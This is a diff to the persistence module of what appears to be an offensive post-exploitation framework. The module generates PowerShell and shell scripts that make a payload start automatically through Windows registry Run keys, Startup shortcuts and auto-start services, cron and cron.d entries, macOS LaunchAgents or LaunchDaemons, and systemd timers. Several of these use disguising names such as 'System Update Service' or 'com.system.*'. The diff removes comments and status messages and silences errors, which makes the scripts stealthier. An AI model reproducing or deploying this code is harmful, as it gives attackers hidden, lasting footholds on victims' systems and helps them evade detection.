@@ -148,117 +148,83 @@ def execute(options, session):
 
 def _generate_registry_persistence(payload_path, name):
     return f'''
-# Windows Registry Persistence
 $payloadPath = "{payload_path}"
 $name = "{name}"
 
 try {{
-    # Current User Run key
     $runKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
     Set-ItemProperty -Path $runKey -Name $name -Value $payloadPath -ErrorAction Stop
-    Write-Output "[+] Registry persistence established at: $runKey\\$name"
-    Write-Output "[+] Payload: $payloadPath"
-    
-    # Verify
+
     $value = Get-ItemProperty -Path $runKey -Name $name -ErrorAction SilentlyContinue
     if ($value) {{
-        Write-Output "[+] Verification successful"
     }} else {{
-        Write-Output "[-] Verification failed"
     }}
 }} catch {{
-    Write-Output "[-] Error: $_"
-    
-    # Try RunOnce as fallback
     try {{
         $runOnceKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
         Set-ItemProperty -Path $runOnceKey -Name $name -Value $payloadPath -ErrorAction Stop
-        Write-Output "[+] Fallback: Registry persistence established at RunOnce key"
     }} catch {{
-        Write-Output "[-] Fallback failed: $_"
     }}
 }}
 '''
 
 def _generate_startup_persistence(payload_path, name):
     return f'''
-# Windows Startup Folder Persistence
 $payloadPath = "{payload_path}"
 $name = "{name}"
 
 try {{
-    # Get Startup folder path
     $startupFolder = [Environment]::GetFolderPath('Startup')
     $lnkPath = Join-Path $startupFolder "$name.lnk"
-    
-    # Create shortcut
+
     $WshShell = New-Object -ComObject WScript.Shell
     $shortcut = $WshShell.CreateShortcut($lnkPath)
     $shortcut.TargetPath = $payloadPath
     $shortcut.WorkingDirectory = Split-Path $payloadPath
     $shortcut.Description = "$name Service"
     $shortcut.Save()
-    
-    Write-Output "[+] Startup persistence established at: $lnkPath"
-    Write-Output "[+] Target: $payloadPath"
-    
-    # Verify
+
     if (Test-Path $lnkPath) {{
-        Write-Output "[+] Verification successful"
     }} else {{
-        Write-Output "[-] Verification failed"
     }}
 }} catch {{
-    Write-Output "[-] Error: $_"
 }}
 '''
 
 def _generate_cron_persistence(payload_path, name, interval):
     return f'''
-# Cron Persistence (Linux/macOS)
 payload_path="{payload_path}"
 name="{name}"
 interval="{interval}"
 
-# Calculate cron interval
 cron_interval="*/$interval * * * *"
 
-# Create cron entry
 cron_entry="$cron_interval $payload_path # $name"
 
-# Check if entry already exists
 if crontab -l 2>/dev/null | grep -q "$name"; then
-    echo "[-] Cron entry already exists for $name"
+    :
 else
-    # Add to crontab
-    (crontab -l 2>/dev/null; echo "$cron_entry") | crontab -
-    
+    (crontab -l 2>/dev/null; echo "$cron_entry" 2>/dev/null) | crontab -
+
     if [ $? -eq 0 ]; then
-        echo "[+] Cron persistence established"
-        echo "[+] Entry: $cron_entry"
-        echo "[+] Verification:"
-        crontab -l | grep "$name"
+        crontab -l | grep "$name" 2>/dev/null > /dev/null
     else
-        echo "[-] Failed to add cron entry"
+        :
     fi
 fi
 
-# Alternative: Write to cron.d (requires root)
 if [ "$(id -u)" -eq 0 ]; then
     cron_file="/etc/cron.d/$name"
-    echo "$cron_interval root $payload_path" > "$cron_file"
+    echo "$cron_interval root $payload_path" > "$cron_file" 2>/dev/null
     chmod 644 "$cron_file"
-    echo "[+] Also created system cron file: $cron_file"
 fi
 '''
 
 def _generate_launchd_persistence(payload_path, name):
     return f'''
-# LaunchAgent Persistence (macOS)
 payload_path="{payload_path}"
 name="{name}"
 
-# Determine if user or system level
 if [ "$(id -u)" -eq 0 ]; then
     plist_dir="/Library/LaunchDaemons"
     label="com.system.$name"
@@ -269,10 +235,8 @@ fi
 
 plist_file="$plist_dir/$label.plist"
 
-# Create directory if it doesn't exist
 mkdir -p "$plist_dir"
 
-# Create LaunchAgent plist
 cat > "$plist_file" << EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -296,37 +260,28 @@ cat > "$plist_file" << EOF
 </plist>
 EOF
 
-# Set permissions
 chmod 644 "$plist_file"
 
-# Load the LaunchAgent
 if launchctl load "$plist_file" 2>/dev/null; then
-    echo "[+] LaunchAgent persistence established"
-    echo "[+] Label: $label"
-    echo "[+] Plist: $plist_file"
-    echo "[+] Payload: $payload_path"
+    :
 else
-    # For newer macOS versions
     launchctl bootstrap gui/$(id -u) "$plist_file" 2>/dev/null
-    echo "[+] LaunchAgent bootstrapped (newer macOS)"
+    :
 fi
 
-# Verify
 if launchctl list | grep -q "$label"; then
-    echo "[+] Verification successful"
+    :
 else
-    echo "[-] Verification failed - agent may need reboot"
+    :
 fi
 '''
 
 def _generate_systemd_persistence(payload_path, name, interval):
     return f'''
-# Systemd Service Persistence (Linux)
 payload_path="{payload_path}"
 name="{name}"
 interval="{interval}"
 
-# Determine if user or system level
 if [ "$(id -u)" -eq 0 ]; then
     service_dir="/etc/systemd/system"
     systemctl_cmd="systemctl"
@@ -339,7 +294,6 @@ fi
 service_file="$service_dir/$name.service"
 timer_file="$service_dir/$name.timer"
 
-# Create systemd service
 cat > "$service_file" << EOF
 [Unit]
 Description=$name Service
@@ -355,7 +309,6 @@ RestartSec=10
 WantedBy=default.target
 EOF
 
-# Create systemd timer
 cat > "$timer_file" << EOF
 [Unit]
 Description=$name Timer
@@ -369,74 +322,45 @@ Unit=$name.service
 WantedBy=timers.target
 EOF
 
-# Reload systemd
 $systemctl_cmd daemon-reload
 
-# Enable and start the timer
 $systemctl_cmd enable "$name.timer"
 $systemctl_cmd start "$name.timer"
 
-echo "[+] Systemd persistence established"
-echo "[+] Service: $service_file"
-echo "[+] Timer: $timer_file"
-echo "[+] Interval: $interval minutes"
-
-# Verify
 if $systemctl_cmd is-enabled "$name.timer" 2>/dev/null; then
-    echo "[+] Verification successful"
-    $systemctl_cmd status "$name.timer" --no-pager
+    $systemctl_cmd status "$name.timer" --no-pager 2>/dev/null
 else
-    echo "[-] Verification failed"
+    :
 fi
 '''
 
 def _generate_service_persistence(payload_path, name):
     return f'''
-# Windows Service Persistence
 $payloadPath = "{payload_path}"
 $serviceName = "{name}"
 
 try {{
-    # Check if service already exists
     $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
-    
+
     if ($existingService) {{
-        Write-Output "[-] Service already exists: $serviceName"
-        Write-Output "[*] Attempting to update service..."
-        
-        # Stop and remove existing service
         Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
         sc.exe delete $serviceName
         Start-Sleep -Seconds 2
     }}
-    
-    # Create new service
+
     $result = sc.exe create $serviceName binPath= "$payloadPath" start= auto DisplayName= "$serviceName Service"
-    
+
     if ($LASTEXITCODE -eq 0) {{
-        Write-Output "[+] Service created: $serviceName"
-        
-        # Set service description
         sc.exe description $serviceName "System Update Service"
-        
-        # Start the service
         Start-Service -Name $serviceName -ErrorAction SilentlyContinue
-        
-        # Verify
+
         $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
         if ($service) {{
-            Write-Output "[+] Service Status: $($service.Status)"
-            Write-Output "[+] Start Type: $($service.StartType)"
-            Write-Output "[+] Verification successful"
         }} else {{
-            Write-Output "[-] Service verification failed"
         }}
     }} else {{
-        Write-Output "[-] Failed to create service (Exit code: $LASTEXITCODE)"
-        Write-Output "[*] This method requires administrator privileges"
     }}
 }} catch {{
-    Write-Output "[-] Error: $_"
 }}
 '''
 
